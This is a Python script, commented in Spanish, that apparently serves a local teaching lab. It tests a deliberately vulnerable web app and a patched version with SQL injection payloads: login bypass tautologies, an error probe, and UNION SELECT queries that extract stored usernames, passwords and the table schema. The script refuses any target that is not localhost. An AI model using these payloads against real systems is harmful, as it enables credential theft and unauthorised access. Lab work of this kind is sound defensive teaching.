"""
ataque_sql_i.py
===============
Script de pruebas de SQL Injection con payloads CONTROLADOS contra el
laboratorio local (app_vulnerable.py / app_segura.py).

Por seguridad, el script SOLO acepta objetivos locales (127.0.0.1 / localhost).

Uso:
    python ataque_sql_i.py --url http://127.0.0.1:5000 --etiqueta ANTES
    python ataque_sql_i.py --url http://127.0.0.1:5001 --etiqueta DESPUES
"""
import argparse
import csv
import sys
from urllib.parse import urlparse

import requests

LOCAL_HOSTS = {"127.0.0.1", "localhost", "::1"}

# (nombre, endpoint, método, parámetros, descripción)
PRUEBAS = [
    ("Login legítimo (control)", "/", "POST",
     {"username": "maria", "password": "maria2026"},
     "Credenciales válidas: debe entrar en ambas versiones"),
    ("Login con credenciales falsas (control)", "/", "POST",
     {"username": "hacker", "password": "incorrecta"},
     "Debe ser denegado en ambas versiones"),
    ("Bypass: OR '1'='1'", "/", "POST",
     {"username": "' OR '1'='1' --", "password": "x"},
     "Tautología: la condición siempre es verdadera"),
    ("Bypass: admin'--", "/", "POST",
     {"username": "admin'--", "password": "x"},
     "Comentario SQL: anula la verificación de contraseña"),
    ("Detección: comilla simple", "/", "POST",
     {"username": "'", "password": "x"},
     "Rompe la sintaxis y revela errores del motor SQL"),
    ("Búsqueda legítima (control)", "/buscar", "GET",
     {"q": "Mouse"}, "Debe devolver 1 producto"),
    ("Extracción: dump de todos los productos", "/buscar", "GET",
     {"q": "' OR '1'='1"}, "Tautología en LIKE: devuelve toda la tabla"),
    ("Extracción UNION: usuarios y contraseñas", "/buscar", "GET",
     {"q": "zzz' UNION SELECT id, username || ':' || password, 0 FROM users --"},
     "UNION SELECT: extrae credenciales de otra tabla"),
    ("Extracción UNION: esquema de la BD", "/buscar", "GET",
     {"q": "zzz' UNION SELECT 1, name, 0 FROM sqlite_master WHERE type='table' --"},
     "Enumera las tablas de la base de datos"),
]


def evaluar(nombre, ruta, resp):
    """Devuelve (veredicto, evidencia) según la respuesta del servidor."""
    t = resp.text
    if ruta == "/":
        if "ACCESO CONCEDIDO" in t:
            return "ACCESO CONCEDIDO", "El servidor otorgó sesión"
        if "Error SQL" in t:
            return "ERROR SQL EXPUESTO", "El servidor reveló un error del motor"
        return "ACCESO DENEGADO", "El servidor rechazó la petición"
    # Búsquedas
    if "admin:" in t or "Adm1n" in t:
        return "DATOS FILTRADOS", "Se extrajeron credenciales de la tabla users"
    if "sqlite_master" in nombre or "esquema" in nombre.lower():
        if "users" in t and "products" in t:
            return "DATOS FILTRADOS", "Se enumeraron tablas de la BD"
    if "Error SQL" in t:
        return "ERROR SQL EXPUESTO", "El servidor reveló un error del motor"
    filas = t.count("<tr><td>")
    if filas > 1:
        return f"{filas} FILA(S)", "Devolvió más registros de los esperados (inyección exitosa)"
    return f"{filas} FILA(S)", "Resultado normal / entrada tratada como texto"


def main():
    ap = argparse.ArgumentParser(description="Pruebas SQLi (solo laboratorio local)")
    ap.add_argument("--url", default="http://127.0.0.1:5000")
    ap.add_argument("--etiqueta", default="PRUEBA")
    ap.add_argument("--csv", default=None, help="Archivo CSV de salida")
    args = ap.parse_args()

    host = urlparse(args.url).hostname
    if host not in LOCAL_HOSTS:
        sys.exit(f"[!] Objetivo '{host}' no permitido. Solo localhost/127.0.0.1.")

    print(f"\n=== Pruebas SQLi [{args.etiqueta}] contra {args.url} ===\n")
    resultados = []
    for nombre, ruta, metodo, params, desc in PRUEBAS:
        try:
            if metodo == "POST":
                r = requests.post(args.url + ruta, data=params, timeout=5)
            else:
                r = requests.get(args.url + ruta, params=params, timeout=5)
        except requests.RequestException as e:
            sys.exit(f"[!] No se pudo conectar: {e}\n    ¿Está corriendo el servidor?")
        veredicto, evidencia = evaluar(nombre, ruta, r)
        resultados.append((nombre, r.status_code, veredicto, evidencia))
        print(f"[{r.status_code}] {nombre}")
        print(f"      payload : {params}")
        print(f"      resultado: {veredicto} — {evidencia}\n")

    # Tabla resumen (útil para el informe)
    print("-" * 78)
    print(f"{'Prueba':<44}{'HTTP':<6}{'Veredicto'}")
    print("-" * 78)
    for n, c, v, _ in resultados:
        print(f"{n:<44}{c:<6}{v}")

    salida = args.csv or f"resultados_{args.etiqueta.lower()}.csv"
    with open(salida, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["prueba", "http", "veredicto", "evidencia"])
        w.writerows(resultados)
    print(f"\n[+] Resultados guardados en {salida}")


if __name__ == "__main__":
    main()
